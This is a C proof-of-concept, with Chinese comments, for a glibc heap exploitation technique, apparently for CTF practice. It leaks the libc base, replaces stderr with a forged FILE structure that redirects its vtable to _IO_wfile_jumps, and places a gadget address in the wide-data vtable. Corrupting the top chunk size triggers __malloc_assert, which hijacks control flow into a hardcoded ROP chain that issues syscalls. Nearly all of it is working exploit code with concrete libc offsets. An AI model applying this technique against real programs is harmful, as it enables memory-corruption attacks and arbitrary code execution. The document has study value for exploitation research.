typedef struct _io_file
{                                          // hex(start at)
    int                   _flags;          // 0x0
    char                 *_IO_read_ptr;    // 0x8
    char                 *_IO_read_end;    // 0x10
    char                 *_IO_read_base;   // 0x18
    char                 *_IO_write_base;  // 0x20
    char                 *_IO_write_ptr;   // 0x28
    char                 *_IO_write_end;   // 0x30
    char                 *_IO_buf_base;    // 0x38
    char                 *_IO_buf_end;     // 0x40
    char                 *_IO_save_base;   // 0x48
    char                 *_IO_backup_base; // 0x50
    char                 *_IO_save_end;    // 0x58
    struct _IO_marker    *_markers;        // 0x60
    struct _IO_FILE      *_chain;          // 0x68
    int                   _fileno;         // 0x70
    int                   _flags2;         // 0x74
    long                  _old_offset;     // 0x78
    unsigned short        _cur_column;     // 0x80
    signed char           _vtable_offset;  // 0x82
    char                  _shortbuf[1];    // 0x83
    void                 *_lock;           // 0x88
    long                  _offset;         // 0x90
    struct _IO_codecvt   *_codecvt;        // 0x98
    struct _IO_wide_data *_wide_data;      // 0xa0
    struct _IO_FILE      *_freeres_list;   // 0xa8
    void                 *_freeres_buf;    // 0xb0
    unsigned long         __pad5;          // 0xb8
    int                   _mode;           // 0xc0
    char                  _unused2[20];    // 0xc4
} _io_file;

typedef struct _io_file_plus
{
    _io_file                 file;   // 0x0
    const struct _IO_jump_t *vtable; // 0xd8
} _io_file_plus;

typedef struct _io_wide_data
{
    int   _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
} _io_wide_data;

int main()
{
    long *p1 = malloc(0x500);
    long* p3 = malloc(0x300);
    char *p2 = malloc(0x20);
    free(p1);
    long libc_base = p1[0] - 0x219ce0;

    long *stderr_adr      = libc_base + 0x21a860;
    long *_io_wfile_jumps = libc_base + 0x2160c0;

    _io_file_plus *fake_stderr = malloc(0x300);
    *stderr_adr                = fake_stderr;
    // stderr地址上写入伪造结构体的地址

    long* _io_save_base = malloc(0x100);
    fake_stderr->file._IO_save_base = _io_save_base;
    // rdi+0x48上写入可控堆地址(rbp)

    long* rax = malloc(0x30);
    _io_save_base[0x3] = rax;
    // rbp+0x18写入可控堆地址(rax)
    rax[0x5] = libc_base + 0x562EC;
    // 最后,rax+0x28写入orw的起点(leave,ret)

    fake_stderr->vtable        = ((long) _io_wfile_jumps + 0x10);
    // 伪造结构体的_vtable写上_IO_wfile_jumps

    fake_stderr->file._wide_data = malloc(0x1f0);
    // 伪造结构体的_wide_data上写入可控堆块地址

    _io_wide_data *wide_data   = fake_stderr->file._wide_data;
    wide_data->_IO_write_ptr  = 0xff;
    wide_data->_IO_write_base = 0x10;
    // fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base

    ((long*)wide_data)[0x1c] = p3;
    p3[3] = libc_base + 0x16a1e0 + 26;
    // fp->_wide_data->vtable[0x1c]改为magic_gadget

    strcpy(&(p2[0x28 + 0x200]), "\x01");
    strcpy(&(p2[0x29 + 0x200]), "\x01");
    strcpy(&(p2[0x2a + 0x200]), "\x00");
    // 将topchunk的size改为不合理的值以触发__malloc_assert
    
    long pop_rax = libc_base + 0x45eb0;
    long pop_rdi = libc_base + 0x2a3e5;
    long pop_rsi = libc_base + 0x2be51;
    long pop_rdx_rbx = libc_base + 0x90529;
    long ret = libc_base + 0x45eb1;
    long syscall = libc_base + 0x1149CA;
    long str = libc_base + 0x167A2;

    _io_save_base[0x1] = pop_rdx_rbx;
    _io_save_base[0x2] = 0x100;
    // _io_save_base[0x3]不能改动，所以用一个pop的gadget把0x3垫掉就行
    _io_save_base[0x4] = pop_rsi;
    _io_save_base[0x5] = str;
    _io_save_base[0x6] = pop_rax;
    _io_save_base[0x7] = 0x0;
    _io_save_base[0x8] = pop_rdi;
    _io_save_base[0x9] = 1;
    _io_save_base[0xa] = syscall;
    _io_save_base[0xb] = rax;

    malloc(0x1000);
    // 触发__malloc_assert
    return 0;
}

// __malloc_assert->__fxprintf->__vfxprintf->locked_vfxprintf->__vfprintf_internal->_IO_file_xsputn
// _IO_file_xsputn通过fp->vtable触发
// 原来的_IO_file_jumps->_IO_file_xsputn的偏移为0x38
// 而我们要去的_IO_wfile_seekoff在_IO_wfile_jumps中偏移为0x48
// 所以在原来_IO_file_jumps的地方写上_IO_wfile_jumps就可以让指向_IO_file_xsputn的偏移指向_IO_wfile_seekoff

// _IO_wfile_seekoff->_IO_switch_to_wget_mode->_IO_WOVERFLOW
// _IO_WOVERFLOW通过fp->_wide_data->_wide_vtable[0x1c]触发
// 所以将fp->_wide_data->_wide_vtable[0x1c]改为后门函数或onegadget地址或magic_gadget
// 并且通过错误的topchunk值触发__malloc_assert即可调用后门函数或onegadget地址或magic_gadget